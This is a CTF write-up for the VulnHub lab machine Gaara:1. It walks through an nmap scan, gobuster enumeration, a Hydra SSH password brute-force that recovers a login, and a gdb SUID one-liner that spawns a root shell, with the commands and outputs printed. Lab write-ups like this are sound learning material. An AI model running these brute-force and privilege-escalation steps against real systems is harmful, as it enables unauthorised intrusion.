---
title: Gaara:1 - Writeup
author: Elman Alizadeh
date: 2022-06-01 11:50:00 +0800
categories: [ctf, VulnHub]
tags: [vulnhub, gaara]
---

Today we will take a look at Vulnhub: Gaara: 1. My goal in sharing this writeup is to show you the way if you are in trouble. Please try to understand each step and take notes.

![Desktop View]({{ "/assets/img/vuln-gaara/1.png" | relative_url }})

## Network scan

```console
nmap -p- -sV -sC --open 192.168.201.142

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 3e:a3:6f:64:03:33:1e:76:f8:e4:98:fe:be:e9:8e:58 (RSA)
|   256 6c:0e:b5:00:e7:42:44:48:65:ef:fe:d7:7c:e6:64:d5 (ECDSA)
|_  256 b7:51:f2:f9:85:57:66:a8:65:54:2e:05:f9:40:d2:f4 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Gaara
|_http-server-header: Apache/2.4.38 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Gobuster

```console
gobuster dir -u http://192.168.201.142 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt

===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.201.142
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/06/01 10:59:28 Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd            (Status: 403) [Size: 280]
/.htaccess            (Status: 403) [Size: 280]
/server-status        (Status: 403) [Size: 280]
/Cryoserver           (Status: 200) [Size: 327]
```

## Web

Url: http://192.168.201.142/Cryoserver

![Desktop View]({{ "/assets/img/vuln-gaara/2.png" | relative_url }})

When I looked at all three, I could not find any useful information.

![Desktop View]({{ "/assets/img/vuln-gaara/3.png" | relative_url }})

There was only text encrypted with base58. It was not useful to decode it either.

[CyberChef](https://gchq.github.io/CyberChef/#recipe=From_Base58%28%27123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz%27,true%29&input=ZjFNZ045bVRmOVNOYnpSeWdjVQ)

gaara:ismyname

Let’s attack ssh

## Hydra

Command: hydra -l gaara -P /usr/share/wordlists/rockyou.txt ssh://192.168.201.142:22

```console
[DATA] attacking ssh://192.168.201.142:22/
[STATUS] 126.00 tries/min, 126 tries in 00:01h, 14344278 to do in 1897:24h, 16 active
[22][ssh] host: 192.168.201.142   login: gaara   password: iloveyou2
1 of 1 target successfully completed, 1 valid password found
```

## Root

Command: find / -perm -u=s 2>/dev/null

```console
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/bin/gdb
/usr/bin/sudo
/usr/bin/gimp-2.10
/usr/bin/fusermount
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/su
/usr/bin/passwd
/usr/bin/mount
/usr/bin/umount
```

[GTFO_gdb](https://gtfobins.github.io/gtfobins/gdb/#capabilities)

Command: gdb -nx -ex ‘python import os; os.setuid(0)’ -ex ‘!bash’ -ex quit

![Desktop View]({{ "/assets/img/vuln-gaara/4.png" | relative_url }})

### And now we are the root

![Desktop View]({{ "/assets/img/vuln-gaara/5.gif" | relative_url }})

“If you have any questions or comments, please do not hesitate to write. Have a good days”
